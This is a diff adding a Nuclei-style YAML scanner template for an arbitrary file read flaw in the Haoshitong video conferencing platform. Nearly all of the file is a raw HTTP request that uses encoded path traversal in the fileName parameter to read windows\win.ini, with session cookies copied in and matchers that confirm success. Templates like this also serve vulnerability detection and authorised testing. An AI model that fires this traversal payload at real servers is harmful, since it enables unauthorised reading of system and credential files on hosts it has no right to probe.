@@ -1,0 +1,40 @@
+id: haoshitong-lfi
+
+info:
+  name: haoshitong-lfi
+  author: Natto97
+  severity: critical
+  description: 好视通视频会议平台任意文件读取
+  reference: http://c.xiankong.com/hst/
+  tags: lfi
+
+requests:
+- raw:
+  - |+
+    GET /register/toDownload.do?fileName=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini HTTP/1.1
+    Host: {{Hostname}}
+    Cookie: topsecsvportallogodir=250; topsecsvuilanguage=chinese; login_err_num=0; topsecsvportalstyle=style1; topsecsvportalname=??????????????; cgid=/IZeOwi2vO1sd5Gafjs7CQ==; mldn-session-id=1e09c508-707f-457f-bea7-e96ed83d08e1; JSESSIONID=2A4718350BDA1DCFB79CC03B8BC8028F
+    Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="100"
+    Sec-Ch-Ua-Mobile: ?0
+    Sec-Ch-Ua-Platform: "Windows"
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+    Sec-Fetch-Site: none
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-User: ?1
+    Sec-Fetch-Dest: document
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Connection: close
+
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '[extensions]'
+  - type: status
+    status:
+    - 200
